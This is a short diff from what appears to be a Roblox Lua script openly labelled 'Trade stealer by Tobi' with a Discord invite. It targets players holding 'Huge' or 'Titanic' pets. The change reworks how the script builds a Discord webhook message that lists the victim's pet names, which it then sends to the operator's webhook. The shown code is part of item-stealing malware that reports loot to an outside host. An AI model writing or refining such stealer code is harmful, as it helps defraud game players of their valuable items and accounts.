@@ -194,16 +194,14 @@ if HasHuge() == "Yes" or HasTitanic() == "Yes" then
 						["footer"] = {
 							["text"] = "Trade stealer by Tobi. discord.gg/HcpNe56R2a"
 						},
-						["fields"] = {}
-					}
-					for _, PetName in ipairs(WebhookList) do
-						local field = {
-							["name"] = "Pet name",
-							["value"] = PetName,
-							["inline"] = false
+						["fields"] = {
+							{
+								["name"] = "Pet names",
+								["value"] = table.concat(WebhookList, "\n"),
+								["inline"] = false
+							}
 						}
-						table.insert(embed.fields, field)
-					end
+					}
 					SendPublic(Webhook, embed)
 				end
 			end
